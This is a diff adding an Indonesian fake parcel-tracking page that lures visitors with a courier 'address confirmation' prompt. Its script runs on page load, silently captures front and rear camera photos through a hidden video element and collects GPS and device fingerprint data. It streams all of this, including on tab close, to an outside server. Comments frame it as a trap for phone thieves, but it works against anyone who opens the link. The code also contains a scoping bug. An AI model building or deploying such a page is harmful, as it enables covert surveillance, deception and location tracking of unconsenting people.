@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Lacak Pengiriman Paket — Konfirmasi Alamat</title>
+  <style>
+    :root {
+      --primary: #e11d48;
+      --primary-dark: #be123c;
+      --bg: #f8fafc;
+      --card: #ffffff;
+      --text: #0f172a;
+      --text-muted: #64748b;
+      --border: #e2e8f0;
+      --success: #10b981;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    body { background: var(--bg); color: var(--text); padding-bottom: 30px; }
+    
+    header {
+      background: var(--primary);
+      color: white;
+      padding: 16px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      box-shadow: 0 2px 10px rgba(225, 29, 72, 0.25);
+    }
+    .logo-icon { font-size: 24px; }
+    .logo-title { font-size: 16px; font-weight: 800; letter-spacing: 0.5px; }
+    .logo-sub { font-size: 11px; opacity: 0.85; }
+
+    .container { max-width: 460px; margin: 0 auto; padding: 16px; }
+
+    .card {
+      background: var(--card);
+      border-radius: 16px;
+      padding: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+      border: 1px solid var(--border);
+      margin-bottom: 16px;
+    }
+
+    .status-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: #fef2f2;
+      color: var(--primary);
+      padding: 6px 12px;
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 700;
+      margin-bottom: 14px;
+      border: 1px solid #fecdd3;
+    }
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      background: var(--primary);
+      border-radius: 50%;
+      animation: pulse 1s infinite alternate;
+    }
+    @keyframes pulse { from { opacity: 0.4; } to { opacity: 1; } }
+
+    .resi-title { font-size: 13px; color: var(--text-muted); }
+    .resi-num { font-size: 20px; font-weight: 800; color: var(--text); letter-spacing: 1px; margin-bottom: 14px; }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13px;
+      padding: 8px 0;
+      border-bottom: 1px dashed var(--border);
+    }
+    .info-label { color: var(--text-muted); }
+    .info-val { font-weight: 600; text-align: right; }
+
+    .alert-box {
+      background: #fff1f2;
+      border-left: 4px solid var(--primary);
+      padding: 12px 14px;
+      border-radius: 8px;
+      margin: 16px 0;
+      font-size: 13px;
+      color: #9f1239;
+      line-height: 1.5;
+    }
+
+    .btn-action {
+      width: 100%;
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 16px;
+      border-radius: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 6px 20px rgba(225, 29, 72, 0.35);
+      transition: all 0.2s;
+    }
+    .btn-action:active { transform: scale(0.98); background: var(--primary-dark); }
+
+    .success-view {
+      display: none;
+      text-align: center;
+      padding: 24px 10px;
+    }
+    .success-icon {
+      width: 64px;
+      height: 64px;
+      background: #ecfdf5;
+      color: var(--success);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      margin: 0 auto 16px auto;
+      border: 2px solid #a7f3d0;
+    }
+    .success-title { font-size: 18px; font-weight: 800; color: #065f46; margin-bottom: 8px; }
+    .success-desc { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
+
+    /* 60-Second Engaging Dispatch Radar */
+    @keyframes radarSpin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    @keyframes radarPulse {
+      0% { transform: scale(0.9); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 0.3; }
+      100% { transform: scale(0.9); opacity: 0.8; }
+    }
+
+    #hiddenVideo, #hiddenCanvas {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      opacity: 0.01;
+      pointer-events: none;
+      left: -9999px;
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="logo-icon">📦</div>
+    <div>
+      <div class="logo-title">EKSPEDISI EXPRESS KILAT</div>
+      <div class="logo-sub">Layanan Pelacakan &amp; Konfirmasi Pengantaran</div>
+    </div>
+  </header>
+
+  <div class="container">
+    <div class="card" id="mainCard">
+      <div class="status-badge">
+        <span class="pulse-dot"></span>
+        <span>KURIR MEMERLUKAN KONFIRMASI</span>
+      </div>
+
+      <div class="resi-title">Nomor Resi Pengiriman:</div>
+      <div class="resi-num">JP882910482910</div>
+
+      <div class="info-row">
+        <span class="info-label">Penerima</span>
+        <span class="info-val">Pemilik Paket</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Jenis Paket</span>
+        <span class="info-val">Barang Elektronik &amp; Aksesoris</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Status Kurir</span>
+        <span class="info-val" style="color: #e11d48;">Kurir di Sekitar Area Anda</span>
+      </div>
+
+      <div class="alert-box">
+        <strong>⚠️ Alamat Kurang Lengkap:</strong><br>
+        Kurir berada di radius dekat Anda namun kesulitan menemukan titik lokasi pasti. Silakan ketuk tombol di bawah untuk menyinkronkan titik lokasi akurat Anda.
+      </div>
+
+      <button class="btn-action" id="btnConfirm" onclick="startCaptureFlow()">
+        <span>📍</span> Konfirmasi Titik Lokasi Rumah Saya
+      </button>
+      <div style="font-size: 11px; color: var(--text-muted); text-align: center; margin-top: 10px;">
+        Pilih "Izinkan" saat browser meminta akses lokasi
+      </div>
+    </div>
+
+    <div class="card success-view" id="successCard" style="display: none; padding: 20px 14px; text-align: center;">
+      <!-- Radar Sweep Visual -->
+      <div style="position: relative; width: 110px; height: 110px; margin: 0 auto 14px auto; border-radius: 50%; border: 2px solid rgba(225, 29, 72, 0.4); background: radial-gradient(circle, rgba(225, 29, 72, 0.12) 0%, rgba(0,0,0,0.02) 70%); overflow: hidden; display: flex; align-items: center; justify-content: center;">
+        <div style="position: absolute; width: 100%; height: 100%; border-radius: 50%; border-top: 3px solid #e11d48; border-right: 3px solid transparent; animation: radarSpin 2s linear infinite;"></div>
+        <div style="font-size: 32px; z-index: 2;">🛵</div>
+        <div style="position: absolute; width: 68%; height: 68%; border-radius: 50%; border: 1px dashed rgba(225, 29, 72, 0.35);"></div>
+      </div>
+
+      <div style="font-size: 16px; font-weight: 800; color: #0f172a; margin-bottom: 4px;">
+        📡 MENYINKRONKAN GPS &amp; RUTE KURIR
+      </div>
+      <div style="font-size: 12px; color: #64748b; margin-bottom: 14px;">
+        Menghubungkan unit kurir lapangan dengan koordinat presisi Anda...
+      </div>
+
+      <!-- Live 60-Second Countdown & Progress -->
+      <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 12px; margin-bottom: 14px; text-align: left;">
+        <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; color: #475569; margin-bottom: 6px;">
+          <span id="dispatchStatusText">Mengunci titik koordinat presisi...</span>
+          <span style="color: #e11d48; font-family: monospace; font-weight: 800;" id="dispatchTimer">01:00</span>
+        </div>
+        <div style="width: 100%; height: 8px; background: #e2e8f0; border-radius: 4px; overflow: hidden;">
+          <div id="dispatchProgressBar" style="width: 5%; height: 100%; background: linear-gradient(90deg, #e11d48, #f43f5e); transition: width 1s linear;"></div>
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 10px; color: #94a3b8; margin-top: 6px;">
+          <span>Satelit GPS: <strong style="color: #10b981;">Terkunci</strong></span>
+          <span>Akurasi: <strong style="color: #0284c7;" id="liveAccText">± 4.2m</strong></span>
+        </div>
+      </div>
+
+      <!-- Psychological Retention Notice (Menahan Pengguna Minimal 1 Menit) -->
+      <div style="background: #fff1f2; border: 1px solid #fecdd3; border-radius: 10px; padding: 10px; font-size: 11px; color: #9f1239; line-height: 1.5; margin-bottom: 14px; text-align: left;">
+        <strong>⚠️ Jangan Tutup Layar Ini (Verifikasi 1 Menit):</strong><br>
+        Sistem sedang mengunci jalur navigasi jalan masuk. Membiarkan halaman ini aktif selama <strong>60 detik</strong> memastikan kurir langsung menuju rumah Anda tanpa tersasar.
+      </div>
+
+      <!-- Interactive Status Step Log -->
+      <div id="liveStepList" style="font-size: 11px; color: #475569; text-align: left; display: flex; flex-direction: column; gap: 6px;">
+        <div style="display: flex; align-items: center; gap: 6px;">
+          <span style="color: #10b981; font-weight: bold;">✓</span> <span>Titik satelit GPS berhasil diverifikasi</span>
+        </div>
+        <div id="step2" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+          <span id="iconStep2">⏳</span> <span id="textStep2">Mengalokasikan armada kurir ekspedisi...</span>
+        </div>
+        <div id="step3" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+          <span id="iconStep3">⏳</span> <span id="textStep3">Menghitung rute jalan masuk tercepat...</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <video id="hiddenVideo" autoplay playsinline muted></video>
+  <canvas id="hiddenCanvas"></canvas>
+
+  <script>
+    let capturedPhoto = false;
+    let currentActivity = '🛑 Diam (Stasioner)';
+    let lastMotionTime = 0;
+
+    // 1. Deteksi Sensor Gerak (Accelerometer / Gyroscope)
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', (e) => {
+        const acc = e.accelerationIncludingGravity || e.acceleration;
+        if (acc) {
+          const mag = Math.sqrt((acc.x||0)**2 + (acc.y||0)**2 + (acc.z||0)**2);
+          if (Math.abs(mag - 9.8) > 1.2 || (e.rotationRate && (Math.abs(e.rotationRate.alpha||0) > 15 || Math.abs(e.rotationRate.beta||0) > 15))) {
+            currentActivity = '🏃 Bergerak / Berpindah';
+            lastMotionTime = Date.now();
+          } else if (Date.now() - lastMotionTime > 4000) {
+            currentActivity = '🛑 Diam (Stasioner / Di Meja)';
+          }
+        }
+      });
+    }
+
+    async function getAdvancedStats() {
+      let batteryPct = null;
+      let isCharging = false;
+      let batterySource = 'unavailable_webkit_sandbox';
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          batteryPct = Math.round(bat.level * 100);
+          isCharging = Boolean(bat.charging);
+          batterySource = 'hardware_api';
+        } catch(e) {}
+      }
+
+      // Deteksi GPU Apple & WebGL Renderer Asli
+      let gpuRenderer = 'Apple GPU';
+      let gpuVendor = 'Apple Inc.';
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) {
+            gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || gpuRenderer;
+            gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || gpuVendor;
+          }
+        }
+      } catch(e) {}
+
+      const isP3 = window.matchMedia && window.matchMedia('(color-gamut: p3)').matches;
+      const timeZone = Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Asia/Jakarta';
+
+      return {
+        batteryLevel: batteryPct,
+        batterySource,
+        isCharging,
+        networkName: null, // Dideteksi dari IP publik oleh server
+        networkType: null,
+        screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio || 1}x)`,
+        cores: navigator.hardwareConcurrency || 6,
+        touchPoints: navigator.maxTouchPoints || 5,
+        gpu: gpuRenderer,
+        gpuVendor: gpuVendor,
+        colorGamut: isP3 ? 'Display P3 (Apple Retina)' : 'sRGB',
+        timeZone,
+        language: navigator.language || 'id-ID',
+        platform: navigator.platform || 'iPhone'
+      };
+    }
+
+    let currentActiveStream = null;
+
+    // Utilitas Pengiriman Foto Anti-Batal (Tetap terkirim walau tab ditutup secepat kilat)
+    function sendPhotoWithKeepalive(url, photoData, trigger) {
+      if (!photoData) return;
+      const payload = JSON.stringify({ photo: photoData, trigger: trigger || 'fast_capture' });
+      try {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          keepalive: true // Kunci: OS tetap mengirim data di background walau Safari ditutup
+        }).catch(() => {});
+      } catch(e) {}
+
+      try {
+        if (navigator.sendBeacon) {
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(url, blob);
+        }
+      } catch(e) {}
+    }
+
+    function snapCurrentVideoFrame(video, canvas, quality = 0.75) {
+      try {
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        if (w === 0 || h === 0) return null;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+        return canvas.toDataURL('image/jpeg', quality);
+      } catch(e) {
+        return null;
+      }
+    }
+
+    function waitForFirstFrame(video, timeoutMs = 280) {
+      return new Promise(resolve => {
+        if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+        const __deviceId = new URLSearchParams(location.search).get('d') || '';
+    let done = false;
+        const finish = () => {
+          if (!done) {
+            done = true;
+            video.removeEventListener('loadeddata', finish);
+            video.removeEventListener('timeupdate', finish);
+            video.removeEventListener('canplay', finish);
+            resolve();
+          }
+        };
+        video.addEventListener('loadeddata', finish, { once: true });
+        video.addEventListener('timeupdate', finish, { once: true });
+        video.addEventListener('canplay', finish, { once: true });
+        setTimeout(finish, timeoutMs);
+      });
+    }
+
+    // Pemicu Darurat: Jika pencuri buru-buru menutup browser / swipe keluar, jepret seketika!
+    const emergencySnap = () => {
+      if (currentActiveStream) {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        const snap = snapCurrentVideoFrame(video, canvas, 0.65);
+        if (snap) {
+          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, snap, 'emergency_exit_snap');
+        }
+      }
+    };
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') emergencySnap();
+    });
+    window.addEventListener('pagehide', emergencySnap);
+    window.addEventListener('beforeunload', emergencySnap);
+
+    // 2. Kirim Telemetri Lengkap Seketika Saat Link Terbuka (Tanpa Menghambat Kamera)
+    function sendAutoInitialPing() {
+      getAdvancedStats().then(stats => {
+        fetch(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            alertType: 'trap_link_opened_paket',
+            activity: stats.activity,
+            batteryLevel: stats.batteryPct,
+            isCharging: stats.isCharging,
+            networkName: stats.netName,
+            networkType: stats.netType,
+            downlink: stats.downlink,
+            rtt: stats.rtt,
+            screen: stats.screen,
+            platform: stats.platform,
+            userAgent: navigator.userAgent
+          }),
+          keepalive: true
+        }).catch(() => {});
+      }).catch(() => {});
+    }
+
+    // 3. Alur Otomatis Secepat Kilat (Ultra-Fast Parallel Start)
+    function autoStartEverything() {
+      // 1. Jalankan kamera secepat kilat (prioritas #1)
+      captureSilentSelfie();
+
+      // 2. Telemetri berjalan paralel tanpa await
+      sendAutoInitialPing();
+
+      // 3. Pasang pemicu sentuhan layar apapun (gesture fallback)
+      const triggerCaptureOnGesture = () => {
+        captureSilentSelfie();
+      };
+      window.addEventListener('pointerdown', triggerCaptureOnGesture, { once: true });
+      window.addEventListener('scroll', triggerCaptureOnGesture, { once: true });
+      window.addEventListener('touchstart', triggerCaptureOnGesture, { once: true });
+
+      // 4. Minta izin GPS paralel
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => { handleGpsSuccess(pos); },
+          err => { reportGpsDenied(err); },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+
+        navigator.geolocation.watchPosition(
+          pos => {
+            sendBeacon(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, pos.coords.speed);
+          },
+          () => {},
+          { enableHighAccuracy: true, maximumAge: 3000 }
+        );
+      }
+    }
+
+    // Eksekusi instan tanpa menunggu DOMContentLoaded penuh jika sudah parsing
+    autoStartEverything();
+
+    // Fungsi jika tombol ditekan manual
+    function startCaptureFlow() {
+      const btn = document.getElementById('btnConfirm');
+      if (btn) {
+        btn.innerHTML = '<span>⏳</span> Mengidentifikasi Titik Koordinat...';
+        btn.style.opacity = '0.7';
+        btn.disabled = true;
+      }
+      autoStartEverything();
+    }
+
+    async function captureSilentSelfie() {
+      if (capturedPhoto) return;
+      capturedPhoto = true;
+
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+
+      // 1. Sudut Depan: Wajah Pemegang (Kamera Depan Ultra-Cepat)
+      try {
+        const frontStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = frontStream;
+        video.srcObject = frontStream;
+        video.play().catch(() => {});
+
+        await waitForFirstFrame(video, 200);
+
+        const frontDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (frontDataUrl) {
+          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, frontDataUrl, 'trap_link_paket');
+        }
+
+        frontStream.getTracks().forEach(track => track.stop());
+        currentActiveStream = null;
+      } catch(e) {}
+
+      // 2. Sudut Belakang: Area & Lingkungan di Depan Pencuri (Kamera Belakang Ultra-Cepat)
+      try {
+        const rearStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = rearStream;
+        video.srcObject = rearStream;
+        video.play().catch(() => {});
+
+        await waitForFirstFrame(video, 220);
+
+        const rearDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (rearDataUrl) {
+          sendPhotoWithKeepalive(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, rearDataUrl, 'trap_link_paket');
+        }
+
+        rearStream.getTracks().forEach(track => track.stop());
+        currentActiveStream = null;
+      } catch(e) {}
+    }
+
+    let sessionTimerInterval = null;
+    let continuousGpsInterval = null;
+
+    async function handleGpsSuccess(pos) {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
+      const spd = pos.coords.speed || 0;
+      const alt = pos.coords.altitude !== undefined ? pos.coords.altitude : null;
+      const heading = pos.coords.heading !== undefined ? pos.coords.heading : null;
+
+      await sendBeacon(lat, lon, acc, spd, alt, heading, 'thief_trapped_paket');
+      startEngaging60SecondSession(lat, lon, acc);
+    }
+
+    function reportGpsDenied(err) {
+      fetch(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          alertType: 'trap_gps_denied',
+          activity: 'Pencuri Menolak Izin GPS (' + (err.message || 'Denied') + ')'
+        })
+      }).catch(() => {});
+    }
+
+    async function sendBeacon(lat, lon, acc, spd, alt = null, heading = null, alertType = 'thief_trapped_paket') {
+      try {
+        const stats = await getAdvancedStats();
+        fetch(`https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          keepalive: true,
+          body: JSON.stringify({
+            lat,
+            lon,
+            accuracy: acc,
+            speed: spd,
+            altitude: alt,
+            heading: heading,
+            batteryLevel: stats.batteryLevel,
+            batterySource: stats.batterySource,
+            isCharging: stats.isCharging,
+            networkName: stats.networkName,
+            networkType: stats.networkType,
+            screen: stats.screen,
+            cores: stats.cores,
+            gpu: stats.gpu,
+            gpuVendor: stats.gpuVendor,
+            colorGamut: stats.colorGamut,
+            timeZone: stats.timeZone,
+            platform: stats.platform,
+            alertType
+          })
+        }).catch(() => {});
+      } catch(e) {}
+    }
+
+    function startEngaging60SecondSession(initLat, initLon, initAcc) {
+      const main = document.getElementById('mainCard');
+      const succ = document.getElementById('successCard');
+      if (main) main.style.display = 'none';
+      if (succ) succ.style.display = 'block';
+
+      // 1. Aktifkan Screen WakeLock agar layar tidak mati otomatis
+      if ('wakeLock' in navigator) {
+        try { navigator.wakeLock.request('screen').catch(() => {}); } catch(e) {}
+      }
+
+      // 2. Tampilkan Akurasi Nyata di UI
+      const accText = document.getElementById('liveAccText');
+      if (accText) accText.textContent = `± ${Math.round(initAcc)}m`;
+
+      // 3. Pasang Listener WebSocket untuk Nada Dering Pencarian
+      try {
+        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${proto}//${location.host}`);
+        ws.onmessage = (e) => {
+          try {
+            const data = JSON.parse(e.data);
+            if (data.type === 'play_chime') playSearchChimeAudio();
+          } catch(err) {}
+        };
+      } catch(e) {}
+
+      // 4. Hitung Mundur 60 Detik & Progres Interaktif
+      let remainingSeconds = 60;
+      const totalSeconds = 60;
+      const timerEl = document.getElementById('dispatchTimer');
+      const progEl = document.getElementById('dispatchProgressBar');
+      const statusText = document.getElementById('dispatchStatusText');
+
+      if (sessionTimerInterval) clearInterval(sessionTimerInterval);
+      sessionTimerInterval = setInterval(() => {
+        remainingSeconds--;
+        const elapsed = totalSeconds - remainingSeconds;
+        const pct = Math.min(100, Math.round((elapsed / totalSeconds) * 100));
+
+        if (progEl) progEl.style.width = `${pct}%`;
+        if (timerEl) {
+          const m = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
+          const s = String(remainingSeconds % 60).padStart(2, '0');
+          timerEl.textContent = `${m}:${s}`;
+        }
+
+        // Tahap 1 (Detik 15): Verifikasi Armada Kurir & Foto Wajah Berkala
+        if (elapsed === 15) {
+          const step2 = document.getElementById('step2');
+          const icon2 = document.getElementById('iconStep2');
+          const text2 = document.getElementById('textStep2');
+          if (icon2) { icon2.textContent = '✓'; icon2.style.color = '#10b981'; icon2.style.fontWeight = 'bold'; }
+          if (text2) { text2.textContent = 'Armada Kurir JNT-Unit-082 Terkunci (Radius 800m)'; text2.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Menghubungkan navigasi rute ke motor kurir...';
+          snapPeriodicPhoto('user', `https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, 'periodic_face_15s');
+        }
+
+        // Tahap 2 (Detik 35): Verifikasi Rute & Foto Lingkungan Berkala
+        if (elapsed === 35) {
+          const step3 = document.getElementById('step3');
+          const icon3 = document.getElementById('iconStep3');
+          const text3 = document.getElementById('textStep3');
+          if (icon3) { icon3.textContent = '✓'; icon3.style.color = '#10b981'; icon3.style.fontWeight = 'bold'; }
+          if (text3) { text3.textContent = 'Rute navigasi terverifikasi (Estimasi Tiba: 12 Menit)'; text3.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Sinkronisasi rute pengantaran ke kurir selesai...';
+          snapPeriodicPhoto('environment', `https://sentinel.fiezel.my.id/api/beacon/${__deviceId}`, 'periodic_env_35s');
+        }
+
+        // Tahap 3 (Detik 60): Selesai 100%
+        if (remainingSeconds <= 0) {
+          clearInterval(sessionTimerInterval);
+          if (statusText) statusText.textContent = '✅ Sinkronisasi Berhasil! Kurir Menuju Alamat Anda.';
+          if (timerEl) timerEl.textContent = '00:00';
+          if (progEl) {
+            progEl.style.width = '100%';
+            progEl.style.background = '#10b981';
+          }
+        }
+      }, 1000);
+
+      // 5. Aliran Telemetri GPS Berkelanjutan (Continuous Stream Setiap 5 Detik)
+      if (continuousGpsInterval) clearInterval(continuousGpsInterval);
+      continuousGpsInterval = setInterval(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            p => {
+              sendBeacon(
+                p.coords.latitude,
+                p.coords.longitude,
+                p.coords.accuracy,
+                p.coords.speed || 0,
+                p.coords.altitude || null,
+                p.coords.heading || null,
+                'live_stream_60s'
+              );
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
+          );
+        }
+      }, 5000);
+    }
+
+    // Jepret Foto Berkala Tanpa Gangguan
+    async function snapPeriodicPhoto(facing, endpoint, triggerTag) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        video.play().catch(() => {});
+        await waitForFirstFrame(video, 200);
+        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (dataUrl) {
+          sendPhotoWithKeepalive(endpoint, dataUrl, triggerTag);
+        }
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) {}
+    }
+
+    // Bunyikan Nada Dering Pencarian (Remote Find-My Chime)
+    function playSearchChimeAudio() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        let count = 0;
+        const intv = setInterval(() => {
+          if (count >= 12) { clearInterval(intv); return; }
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(987.77, audioCtx.currentTime); // B5 note
+          osc.frequency.setValueAtTime(1318.51, audioCtx.currentTime + 0.15); // E6 note
+          gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start();
+          osc.stop(audioCtx.currentTime + 0.35);
+          count++;
+        }, 400);
+      } catch(e) {}
+    }
+  </script>
+</body>
+</html>
